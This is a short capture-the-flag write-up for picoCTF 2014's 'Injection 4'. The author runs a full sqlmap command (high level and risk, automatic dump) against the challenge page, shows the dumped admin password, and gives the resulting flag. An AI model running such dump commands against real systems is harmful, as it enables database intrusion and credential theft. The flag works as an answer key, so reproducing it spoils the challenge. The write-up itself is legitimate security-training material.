#Injection 4 - 150

For this problem, I fired up sqlmap (https://github.com/sqlmapproject) an automated SQL injection and database takeover tool. Using the followin command to find a vulnerability and enumerate the databse:
```
./sqlmap.py -u http://web2014.picoctf.com/injection4/ --forms --level=5 --risk=3 --batch --dump
```

Gave me the following information:

```
Database: sql4
Table: users
[1 entry]
+----+----------+-----------------------------+
| id | username | password                    |
+----+----------+-----------------------------+
| 1  | admin    | youllneverguessthispassword |
+----+----------+-----------------------------+
```

Logging in with the password revealed:

```
Logged in!

Your flag is: whereof_one_cannot_speak_thereof_one_must_be_silent
```